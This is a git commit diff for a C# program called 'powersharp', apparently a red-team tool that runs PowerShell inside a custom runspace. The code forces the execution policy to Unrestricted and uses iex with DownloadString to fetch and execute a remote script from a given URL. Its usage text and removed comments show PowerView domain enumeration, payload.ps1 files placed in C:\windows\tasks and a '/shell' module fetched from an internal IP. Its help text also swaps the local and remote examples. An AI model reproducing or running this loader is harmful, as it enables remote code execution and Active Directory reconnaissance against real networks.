73f039fd6965faf28a61e1211a9b730af060692e
Gustav <33692631+ziyishen97@users.noreply.github.com>
2022-10-16 17:00:13 -0400

    Update Program.cs

--- powersharp/Program.cs
+++ powersharp/Program.cs
@@ -1,31 +1,49 @@
-﻿using System;
+using System;
 using System.Collections.ObjectModel;
 using System.Linq;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
+using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading.Tasks;
+
 
 namespace powersharp
 {
-    class Program
+    public class Program
     {
-        static void Main(string[] args)
+        public static void Display()
         {
-            //Example Input: powersharp.exe -m http://192.168.0.100/powerview.ps1 -c "Get-NetUser | select samaccountname"
-            //Example Input: powersharp.exe -m C:\windows\tasks\powerview.ps1 -c "Get-NetComputer | select dnshostname"
-            //Example Input: powersharp.exe -m C:\windows\tasks\payload.ps1 
-            //Example Input: powersharp.exe -m "\\\\WEB01\\C$\\windows\\tasks\\payload.ps1" 
-            //Example Input: powersharp.exe -c "$ExecutionContext.SessionState.LanguageMode"
-            String module = args[0];
-            String command = args[1];
+            Console.WriteLine("Usage: powersharp.exe \"/m:<Module>\" \"/c:<cmdlet>\"");
+            Console.WriteLine("Import a remote module and execute a cmdlet: powersharp.exe \"/m:.\\powerview.ps1\" \"/c:Get-NetComputer | select dnshostname\" ");
+            Console.WriteLine("Import a local module and execute a cmdlet: powersharp.exe \"/m:http://192.168.1.100/powerview.ps1'  \"/c:Get-NetComputer | select dnshostname\" ");
+            Console.WriteLine("Execute a cmdlet without importing a module: powersharp.exe \"/m:\" '/c:Get-Process\" ");
+            Console.WriteLine("Import a module without executing a cmdlet: powersharp.exe \"/m:http://192.168.1.100/shell\"  \"/c:\" ");
+            Console.WriteLine("Recommend to minimize required output by ultilizing \"select\" ");
+        }
+        public static void Main(string[] args)
+        {
+            if (args.Length !=2 || !args[0].Substring(0,3).Contains("/m:") || !args[1].Substring(0, 3).Contains("/c:"))
+            {
+                Display();
+                return;
+            }
+            String module = args[0].Substring(3);
+            String command = args[1].Substring(3);
             if (module.Contains("http"))
             {
                 command = "Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force;iex(New-Object Net.Webclient).DownloadString('" + module + "')" + ";" + command;
-
             }
             else
             {
-                command = "Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force;ipmo " + module+";" + command;
+                if (module == "")
+                {
+                    command = "Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force;"+ command;
+                }
+                else
+                {
+                    command = "Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force;ipmo " + module + ";" + command;
+                }
             }
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
@@ -42,4 +60,5 @@ namespace powersharp
             rs.Close();
         }
     }
+
 }
